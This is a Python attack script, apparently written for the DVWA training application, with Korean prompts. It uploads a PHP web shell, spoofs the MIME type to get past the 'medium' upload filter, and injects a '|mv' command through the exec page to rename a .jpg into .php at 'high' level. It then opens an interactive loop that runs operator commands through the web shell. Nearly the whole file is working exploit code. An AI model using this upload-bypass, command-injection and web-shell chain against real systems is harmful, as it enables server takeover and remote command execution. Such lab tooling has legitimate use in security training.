def run(upload_target_url, headers, php_code, find_path_dic, level):
    from tabulate import tabulate
    import requests
    from bs4 import BeautifulSoup
    from rich.console import Console
    from rich.table import Table
    import random
    import string
    import os
    from urllib.parse import urlparse

    console = Console()

    file_name = input("저장할 파일명을 입력하세요 (예: shell.php 또는 shell.jpg): ").strip()
    
    with open(file_name, "wb") as f:
        f.write(php_code)

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        upload_url = upload_target_url.split("vulnerabilities/upload/")[0] + "hackable/uploads/"
        ext = os.path.splitext(file_name)[1].lower()

        if 'upload' not in param_url:
            continue
            
        data = {'Upload': 'Upload'}
        files = {}

        if level == 'medium':
            mime_type = 'image/jpeg'
            with open(file_name, 'rb') as file:
                for param in param_dic['param']:
                    if param in ['MAX_FILE_SIZE', 'Upload']:
                        continue
                    files[param] = (file_name, file, mime_type)
                res = requests.post(param_url, files=files, data=data, headers=headers)
        else:
            with open(file_name, 'rb') as file:
                for param in param_dic['param']:
                    if param in ['MAX_FILE_SIZE', 'Upload']:
                        continue
                    files[param] = (file_name, file)
                res = requests.post(param_url, files=files, data=data, headers=headers)

        # 업로드 성공 여부 확인
        if "succesfully uploaded" in res.text.lower():
            print(f"업로드 성공 : {file_name}")

            # High일 경우 mv 우회 시도
            if level == 'high' and '.jpg' in file_name:
                shell_file = os.path.splitext(file_name)[0] + '.php'
                print("High 보안 레벨: mv 우회 시도")

                # mv 우회 Command Injection
                payload = f"|mv ../../hackable/uploads/{file_name} ../../hackable/uploads/{shell_file}"
                exec_data = {'ip': payload, 'Submit': 'Submit'}
                command_url = upload_target_url.replace("upload", "exec")

                res = requests.post(command_url, headers=headers, data=exec_data)
                webshell_url = f"{upload_url}{shell_file}"
            else:
                webshell_url = f"{upload_url}{file_name}"

            # 웹쉘 실행 루프
            while True:
                cmd = input("명령어 입력 (break를 입력하면 종료) : ").strip()
                if cmd.lower() == 'break':
                    break

                try:
                    r = requests.get(
                        f"{webshell_url}",
                        params={"cmd": cmd},
                        headers=headers,
                        timeout=5
                    )
                    soup = BeautifulSoup(r.text, "html.parser")
                    print("[+] 명령 결과:\n" + soup.get_text().strip())
                except Exception as e:
                    print(f"[!] 요청 실패: {e}")
        else:
            print(f"업로드 실패 : {file_name}")









    # for param_dic in find_path_dic:
    #     param_url = param_dic['url']
    #     param_method = param_dic['method']
    #     param_name = param_dic['param'][0]
    #     while True:
    #         with open(file_name, "wb") as f:
    #             f.write(php_code)

    #         data = {'Upload': 'Upload'}
    #         files = {}
    #         ext = os.path.splitext(file_name)[1].lower()
    #         mime_type = 'image/jpeg'

    #         with open(file_name, 'rb') as file:
    #             for param in param_dic['param']:
    #                 if param in ['MAX_FILE_SIZE', 'Upload']:
    #                     continue
    #                 else:
    #                     files[param] = (file_name, file, mime_type)
    #             res = requests.post(param_url, files=files, data=data, headers=headers)

                
    #             webshell_url = f"{upload_url}{file_name}"
    #             while True:
    #                 cmd = input("commix(shell) > ").strip()
    #                 if cmd.lower() == "break":
    #                     break
    #                 try:
    #                     r = requests.get(webshell_url, params={"cmd": cmd}, headers=headers, timeout=5)
    #                     soup = BeautifulSoup(r.text, "html.parser")
    #                     print("[+] 명령 결과:\n" + soup.get_text().strip())
    #                 except Exception as e:
    #                     print(f"[!] 요청 실패: {e}")
    

